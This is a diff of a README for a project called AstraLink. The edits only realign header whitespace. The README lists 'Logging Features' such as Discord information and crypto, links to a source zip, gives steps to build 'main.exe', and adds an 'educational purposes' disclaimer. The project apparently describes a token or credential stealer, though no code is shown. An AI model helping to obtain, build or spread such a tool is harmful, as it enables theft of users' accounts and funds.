@@ -11,7 +11,7 @@
 
 
 
-                                              ⬇ Logging Features ⬇
+                                               ⬇ Logging Features ⬇
 
 
 -   Discord Information 
@@ -117,7 +117,7 @@
    - Crypto 
 
 
-                                                         ⬇ Instructions ⬇
+                                              ⬇ Instructions ⬇
 
 
 - [Download source code zip](https://github.com/metaversnova/AstraLink/archive/refs/heads/main.zip)
@@ -127,7 +127,7 @@
 - Follow the instructions and the executable file should be in the ‘’dist’’ folder as ‘’main.exe’’
 
 
-                                                           ⬇ Dependencies ⬇
+                                              ⬇ Dependencies ⬇
      
 -   [Python](https://www.python.org/downloads/release/python-3109/)
 -   [Git](https://git-scm.com/download/win)
@@ -140,7 +140,7 @@
 </div>
  
  
-                                                        ⬇ Issues? Contributor? ⬇
+                                          ⬇ Issues? Contributor? ⬇
 
 
 * View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
@@ -148,7 +148,7 @@
 * Reach out to me at any linked platform on https://about.me/metaversenova
 
 
-                                                ⬇ Educational Purposes Disclosure ⬇
+                                    ⬇ Educational Purposes Disclosure ⬇
 
 
 - <bold> This tool is a tool that should be used only for educational purposes. I do not hold any responsibility for any misuse! </bold>
